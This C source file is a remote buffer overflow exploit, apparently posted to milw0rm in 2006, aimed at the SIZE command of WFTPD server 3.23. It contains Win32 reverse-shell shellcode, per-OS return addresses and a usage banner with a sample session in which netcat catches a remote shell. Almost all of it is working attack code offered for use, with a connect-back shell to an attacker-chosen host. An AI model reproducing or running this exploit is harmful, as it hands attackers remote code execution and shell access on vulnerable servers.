/*
* wftpd_exp.c
* WFTPD server 3.23 (SIZE) 0day remote buffer overflow exploit
* coded by h07 <h07@interia.pl> 
* tested on XP SP2 polish, 2000 SP4 polish
* example..

C:\\>wftpd_exp 0 0 192.168.0.2 h07 open 192.168.0.1 4444

[*] WFTPD server 3.23 (SIZE) 0day remote buffer overflow exploit
[*] coded by h07 <h07@interia.pl>
[*] FTP response: 331 Give me your password, please
[*] FTP response: 230 Logged in successfully
[+] sending buffer: ok
[*] press enter to quit

C:\\>nc -l -p 4444
Microsoft Windows XP [Wersja 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\\wftpd323>
*/

#include <stdio.h>
#include <winsock2.h>
#define BUFF_SIZE 1024
#define PORT 21

//win32 reverse shellcode (metasploit.com)

char shellcode[] =

\"\\x31\\xc9\\x83\\xe9\\xb8\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xb6\"
\"\\x10\\x92\\x98\\x83\\xeb\\xfc\\xe2\\xf4\\x4a\\x7a\\x79\\xd5\\x5e\\xe9\\x6d\\x67\"
\"\\x49\\x70\\x19\\xf4\\x92\\x34\\x19\\xdd\\x8a\\x9b\\xee\\x9d\\xce\\x11\\x7d\\x13\"
\"\\xf9\\x08\\x19\\xc7\\x96\\x11\\x79\\xd1\\x3d\\x24\\x19\\x99\\x58\\x21\\x52\\x01\"
\"\\x1a\\x94\\x52\\xec\\xb1\\xd1\\x58\\x95\\xb7\\xd2\\x79\\x6c\\x8d\\x44\\xb6\\xb0\"
\"\\xc3\\xf5\\x19\\xc7\\x92\\x11\\x79\\xfe\\x3d\\x1c\\xd9\\x13\\xe9\\x0c\\x93\\x73\"
\"\\xb5\\x3c\\x19\\x11\\xda\\x34\\x8e\\xf9\\x75\\x21\\x49\\xfc\\x3d\\x53\\xa2\\x13\"
\"\\xf6\\x1c\\x19\\xe8\\xaa\\xbd\\x19\\xd8\\xbe\\x4e\\xfa\\x16\\xf8\\x1e\\x7e\\xc8\"
\"\\x49\\xc6\\xf4\\xcb\\xd0\\x78\\xa1\\xaa\\xde\\x67\\xe1\\xaa\\xe9\\x44\\x6d\\x48\"
\"\\xde\\xdb\\x7f\\x64\\x8d\\x40\\x6d\\x4e\\xe9\\x99\\x77\\xfe\\x37\\xfd\\x9a\\x9a\"
\"\\xe3\\x7a\\x90\\x67\\x66\\x78\\x4b\\x91\\x43\\xbd\\xc5\\x67\\x60\\x43\\xc1\\xcb\"
\"\\xe5\\x53\\xc1\\xdb\\xe5\\xef\\x42\\xf0\\xb6\\x10\\x92\\x98\\xd0\\x78\\x92\\x98\"
\"\\xd0\\x43\\x1b\\x79\\x23\\x78\\x7e\\x61\\x1c\\x70\\xc5\\x67\\x60\\x7a\\x82\\xc9\"
\"\\xe3\\xef\\x42\\xfe\\xdc\\x74\\xf4\\xf0\\xd5\\x7d\\xf8\\xc8\\xef\\x39\\x5e\\x11\"
\"\\x51\\x7a\\xd6\\x11\\x54\\x21\\x52\\x6b\\x1c\\x85\\x1b\\x65\\x48\\x52\\xbf\\x66\"
\"\\xf4\\x3c\\x1f\\xe2\\x8e\\xbb\\x39\\x33\\xde\\x62\\x6c\\x2b\\xa0\\xef\\xe7\\xb0\"
\"\\x49\\xc6\\xc9\\xcf\\xe4\\x41\\xc3\\xc9\\xdc\\x11\\xc3\\xc9\\xe3\\x41\\x6d\\x48\"
\"\\xde\\xbd\\x4b\\x9d\\x78\\x43\\x6d\\x4e\\xdc\\xef\\x6d\\xaf\\x49\\xc0\\xfa\\x7f\"
\"\\xcf\\xd6\\xeb\\x67\\xc3\\x14\\x6d\\x4e\\x49\\x67\\x6e\\x67\\x66\\x78\\x62\\x12\"
\"\\xb2\\x4f\\xc1\\x67\\x60\\xef\\x42\\x98\";

void config_shellcode(unsigned long ip, unsigned short port)
  {
  memcpy(&shellcode[184], &ip, 4);
  memcpy(&shellcode[190], &port, 2);  
  }     

unsigned long target[] = 
  {
  0x7d16887b, //JMP ESI (XP SP2 polish)
  0x776f2015, //JMP ESI (2000 SP4 polish)
  0x7cb9e082, //JMP ESI (XP SP2 english)
  0x7848a5f1, //JMP ESI (2000 SP4 english)
  0x7ca96834  //JMP ESI (XP SP2 german) 
  };           

char buffer[BUFF_SIZE];

main(int argc, char *argv[])
{
int sock, id, opt, r_len;
unsigned long eip;
unsigned long connectback_IP;
unsigned short connectback_port;
struct hostent *he;
struct sockaddr_in client;
WSADATA wsa;

printf(\"\\n[*] WFTPD server 3.23 (SIZE) 0day remote buffer overflow exploit\\n\");
printf(\"[*] coded by h07 <h07@interia.pl>\\n\");  

if(argc < 8)
  {
  printf(\"[*] usage:..\\n %s <ID> <opt> <host> <user> <pass> <connectback_IP> <connectback_port>\\n\\n\", argv[0]);
  printf(\"[*] ID list:\\n\");
  printf(\"[>] 0: XP SP2 polish\\n\");
  printf(\"[>] 1: 2000 SP4 polish\\n\");
  printf(\"[>] 2: XP SP2 english\\n\");
  printf(\"[>] 3: 2000 SP4 english\\n\");
  printf(\"[>] 4: XP SP2 german\\n\\n\");
  printf(\"[*] opt - WFTPD option \'restrict to home directory and below\'\\n\");
  printf(\"[>] 0: disabled\\n\");
  printf(\"[>] 1: enabled\\n\\n\");
  printf(\"[*] sample: %s 0 0 192.168.0.2 h07 open 192.168.0.1 4444\\n\\n\", argv[0]);
  exit(0);   
  } 

WSAStartup(MAKEWORD(2, 0), &wsa);

id = atoi(argv[1]);
opt = atoi(argv[2]);

if((id > 4) || (id < 0))
  {
  printf(\"[-] ID error: unknown target\\n\");
  exit(-1);     
  }  
  
if((opt > 1) || (opt < 0))
  {
  printf(\"[-] opt error: unknown option\\n\");
  exit(-1);      
  }          
  
eip = target[id];
connectback_IP = inet_addr(argv[6]) ^ (ULONG)0x989210b6;
connectback_port = htons(atoi(argv[7])) ^ (USHORT)0x9892;
config_shellcode(connectback_IP, connectback_port);

sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

if((he = gethostbyname(argv[3])) == NULL)
  {
  printf(\"[-] Unable to resolve\\n\");
  exit(-1); 
  }
 
client.sin_addr = *((struct in_addr *)he->h_addr); 
client.sin_port = htons(PORT); 
client.sin_family = AF_INET;   

if(connect(sock, (struct sockaddr *) &client, sizeof(client)) == -1)
  {
  printf(\"[-] error: connect()\\n\");
  exit(-1);
  }

recv(sock, buffer, BUFF_SIZE -1, 0); 

//USER
memset(buffer, 0, BUFF_SIZE);
sprintf(buffer, \"USER %s\\r\\n\", argv[4]);
send(sock, buffer, strlen(buffer), 0);  
recv(sock, buffer, BUFF_SIZE -1, 0);
printf(\"[*] FTP response: %s\", buffer);

//PASS
memset(buffer, 0, BUFF_SIZE);
sprintf(buffer, \"PASS %s\\r\\n\", argv[5]);
send(sock, buffer, strlen(buffer), 0);  
recv(sock, buffer, BUFF_SIZE -1, 0);
printf(\"[*] FTP response: %s\", buffer);

if(strstr(buffer, \"530\") != 0) exit(-1);

//SIZE
memset(buffer, 0x90, BUFF_SIZE);
memcpy(buffer, \"SIZE \", 5);

switch(opt)
  {
  case 0:
    { 
    memcpy(buffer + 5, \"/\", 1);
    r_len = 531;
    break;
    }
  case 1: 
    {
    memcpy(buffer + 5, \"//\", 2);
    r_len = 532;
    break;
    }                  
  }

memcpy(buffer + 7, shellcode, sizeof(shellcode) -1);          
*((unsigned long*)(&buffer[r_len])) = eip;
memcpy(buffer + (r_len + 4), \"\\r\\n\\x00\", 3);


if(send(sock, buffer, strlen(buffer), 0) != -1)
  printf(\"[+] sending buffer: ok\\n\");
  else
  printf(\"[-] sending buffer: failed\\n\");
    
printf(\"[*] press enter to quit\\n\");
getchar();    
}

//EoF

// milw0rm.com [2006-08-21]
